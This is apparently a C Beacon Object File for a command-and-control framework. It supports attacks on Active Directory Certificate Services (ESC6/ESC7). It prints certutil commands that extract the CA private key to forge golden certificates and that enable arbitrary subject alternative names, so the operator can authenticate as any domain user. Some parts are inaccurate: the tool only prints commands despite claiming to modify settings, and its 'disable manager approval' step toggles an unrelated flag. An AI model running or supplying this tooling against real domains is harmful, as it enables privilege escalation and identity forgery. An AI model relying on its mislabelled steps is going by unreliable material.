/*
 * cert_manageca - Manage Certificate Authority Settings
 *
 * Enumerates and (with permissions) modifies CA configuration.
 * Useful for ESC7 exploitation where you have CA manager rights.
 *
 * Can enable/disable:
 * - Manager approval requirements
 * - SAN extension handling
 * - Audit settings
 * - Request disposition settings
 *
 * Usage: cert_manageca /ca:CA_CONFIG [/action:ACTION] [/setting:VALUE]
 */

#include "include/adcs_struct.h"
#include "include/adcs_utils.h"
#include "beacon.h"

/* CA Configuration Constants */
#define CR_FLG_CRLF_REBUILD_MODIFIED_SUBJECT_ONLY  0x00000001
#define CR_FLG_CRLF_DISABLE_ROOT_CROSS_CERTS       0x00000002
#define CR_FLG_CRLF_PUBLISH_EXPIRED_CERT_CRLS      0x00000004
#define CR_FLG_ALLOW_REQUEST_ATTRIBUTE_SUBJECT     0x00000010
#define CR_FLG_ENFORCE_ENROLLMENT_AGENT            0x00000020
#define CR_FLG_DISABLE_RDN_REORDER                 0x00000100


typedef struct {
    char* buffer;
    int length;
    int position;
} ARG_PARSER;

static void arg_init(ARG_PARSER* parser, char* buffer, int length) {
    parser->buffer = buffer;
    parser->length = length;
    parser->position = 0;
}

static char* arg_get(ARG_PARSER* parser, const char* name) {
    char* buf = parser->buffer;
    int len = parser->length;
    char search[64];
    sprintf(search, "/%s:", name);
    int searchLen = strlen(search);

    for (int i = 0; i < len - searchLen; i++) {
        if (strncmp(buf + i, search, searchLen) == 0) {
            char* start = buf + i + searchLen;
            char* end = start;
            while (*end && *end != ' ' && *end != '\t' && *end != '\n') end++;
            int valueLen = end - start;
            char* value = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, valueLen + 1);
            if (value) {
                memcpy(value, start, valueLen);
                value[valueLen] = '\0';
            }
            return value;
        }
    }

    sprintf(search, "/%s", name);
    searchLen = strlen(search);
    for (int i = 0; i < len - searchLen; i++) {
        if (strncmp(buf + i, search, searchLen) == 0) {
            char next = buf[i + searchLen];
            if (next == '\0' || next == ' ' || next == '\t' || next == '\n') {
                char* value = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 2);
                if (value) value[0] = '1';
                return value;
            }
        }
    }

    return NULL;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* ca = NULL;
    char* action = NULL;
    char* setting = NULL;

    BeaconFormatAlloc(&output, 32768);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Manage Certificate Authority\n\n");


    ca = arg_get(&parser, "ca");
    action = arg_get(&parser, "action");
    setting = arg_get(&parser, "setting");

    if (!ca) {
        BeaconFormatPrintf(&output, "[-] Error: /ca:CA_CONFIG required\n\n");
        BeaconFormatPrintf(&output, "Usage: cert_manageca /ca:SERVER\\\\CAName [/action:ACTION]\n\n");
        BeaconFormatPrintf(&output, "Actions:\n");
        BeaconFormatPrintf(&output, "  info        - Display CA configuration (default)\n");
        BeaconFormatPrintf(&output, "  backup      - Show backup commands\n");
        BeaconFormatPrintf(&output, "  templates   - List published templates\n");
        BeaconFormatPrintf(&output, "  security    - Show security descriptor commands\n");
        BeaconFormatPrintf(&output, "  flags       - Show flag modification commands\n\n");
        BeaconFormatPrintf(&output, "Examples:\n");
        BeaconFormatPrintf(&output, "  cert_manageca /ca:dc01.corp.local\\\\corp-CA\n");
        BeaconFormatPrintf(&output, "  cert_manageca /ca:dc01.corp.local\\\\corp-CA /action:backup\n");
        goto cleanup;
    }

    if (!action) {
        action = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 8);
        if (action) strcpy(action, "info");
    }

    BeaconFormatPrintf(&output, "[*] CA Configuration: %s\n", ca);
    BeaconFormatPrintf(&output, "[*] Action: %s\n\n", action);

    if (strcmp(action, "info") == 0) {
        BeaconFormatPrintf(&output, "[*] CA Information Commands:\n\n");

        BeaconFormatPrintf(&output, "Get CA information:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -ping\n\n", ca);

        BeaconFormatPrintf(&output, "Get CA certificate:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -ca.cert ca.cer\n\n", ca);

        BeaconFormatPrintf(&output, "Get CA chain:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -ca.chain ca-chain.p7b\n\n", ca);

        BeaconFormatPrintf(&output, "View CA configuration:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -getreg CA\n\n", ca);

        BeaconFormatPrintf(&output, "View edit flags (ESC6 check):\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -getreg policy\\\\EditFlags\n\n", ca);

        BeaconFormatPrintf(&output, "Check if EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled:\n");
        BeaconFormatPrintf(&output, "  If EditFlags contains 0x%08X, SAN can be added to any request!\n\n",
            0x00040000);

        BeaconFormatPrintf(&output, "View interface flags:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -getreg CA\\\\InterfaceFlags\n\n", ca);

    } else if (strcmp(action, "backup") == 0) {
        BeaconFormatPrintf(&output, "[*] CA Backup Commands (Requires CA Admin):\n\n");

        BeaconFormatPrintf(&output, "[!] WARNING: This extracts the CA private key!\n\n");

        BeaconFormatPrintf(&output, "Backup CA key and certificate:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -backupkey C:\\\\backup\n\n", ca);

        BeaconFormatPrintf(&output, "Backup entire CA (database + key):\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -backup C:\\\\backup\n\n", ca);

        BeaconFormatPrintf(&output, "Export CA cert only:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -ca.cert ca.cer\n\n", ca);

        BeaconFormatPrintf(&output, "[*] After backup, use cert_forge to create golden certificates!\n");

    } else if (strcmp(action, "templates") == 0) {
        BeaconFormatPrintf(&output, "[*] Template Management Commands:\n\n");

        BeaconFormatPrintf(&output, "List published templates:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -CATemplates\n\n", ca);

        BeaconFormatPrintf(&output, "Add template to CA (requires CA Admin):\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -SetCATemplates +TemplateName\n\n", ca);

        BeaconFormatPrintf(&output, "Remove template from CA:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -SetCATemplates -TemplateName\n\n", ca);

        BeaconFormatPrintf(&output, "[*] Template enumeration:\n");
        BeaconFormatPrintf(&output, "  Use cert_find to find vulnerable templates\n");

    } else if (strcmp(action, "security") == 0) {
        BeaconFormatPrintf(&output, "[*] CA Security Descriptor Commands:\n\n");

        BeaconFormatPrintf(&output, "View CA security:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -getreg CA\\\\Security\n\n", ca);

        BeaconFormatPrintf(&output, "View CA ACL in readable format:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -getacl\n\n", ca);

        BeaconFormatPrintf(&output, "[*] Key permissions to check:\n");
        BeaconFormatPrintf(&output, "  - ManageCA: Can modify CA configuration (ESC7)\n");
        BeaconFormatPrintf(&output, "  - ManageCertificates: Can approve pending requests\n");
        BeaconFormatPrintf(&output, "  - Enroll: Can request certificates\n");
        BeaconFormatPrintf(&output, "  - AutoEnroll: Automatic enrollment allowed\n\n");

        BeaconFormatPrintf(&output, "[*] ESC7 check: If low-priv user has ManageCA:\n");
        BeaconFormatPrintf(&output, "  1. Enable EDITF_ATTRIBUTESUBJECTALTNAME2\n");
        BeaconFormatPrintf(&output, "  2. Request cert with arbitrary SAN\n");
        BeaconFormatPrintf(&output, "  3. Authenticate as any user\n");

    } else if (strcmp(action, "flags") == 0) {
        BeaconFormatPrintf(&output, "[*] CA Flag Modification (ESC7 Exploitation):\n\n");

        BeaconFormatPrintf(&output, "[!] Requires ManageCA permission\n\n");

        BeaconFormatPrintf(&output, "Current edit flags:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -getreg policy\\\\EditFlags\n\n", ca);

        BeaconFormatPrintf(&output, "Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6):\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -setreg policy\\\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2\n\n", ca);

        BeaconFormatPrintf(&output, "Disable manager approval:\n");
        BeaconFormatPrintf(&output, "  certutil -config \"%s\" -setreg policy\\\\EditFlags -EDITF_ATTRIBUTEENDDATE\n\n", ca);

        BeaconFormatPrintf(&output, "Restart CA service (required after changes):\n");
        BeaconFormatPrintf(&output, "  net stop certsvc && net start certsvc\n\n");

        BeaconFormatPrintf(&output, "[*] After enabling EDITF_ATTRIBUTESUBJECTALTNAME2:\n");
        BeaconFormatPrintf(&output, "  Any template with client auth EKU becomes exploitable!\n");
        BeaconFormatPrintf(&output, "  Request with: /altname:admin@domain.local\n\n");

        BeaconFormatPrintf(&output, "[*] Important flags:\n");
        BeaconFormatPrintf(&output, "  EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000) - Allow SAN in request\n");
        BeaconFormatPrintf(&output, "  EDITF_ADDOLDCERTTYPE (0x00000010) - Add old cert type\n");
        BeaconFormatPrintf(&output, "  EDITF_ATTRIBUTEENDDATE (0x00000020) - Set end date\n");
    }

    BeaconFormatPrintf(&output, "\n[*] Related ESC Vulnerabilities:\n");
    BeaconFormatPrintf(&output, "  ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 enabled globally\n");
    BeaconFormatPrintf(&output, "  ESC7: Low-priv user has ManageCA rights on CA\n");
    BeaconFormatPrintf(&output, "  ESC8: HTTP enrollment endpoints without auth\n");

cleanup:
    if (ca) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ca);
    if (action) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, action);
    if (setting) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, setting);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
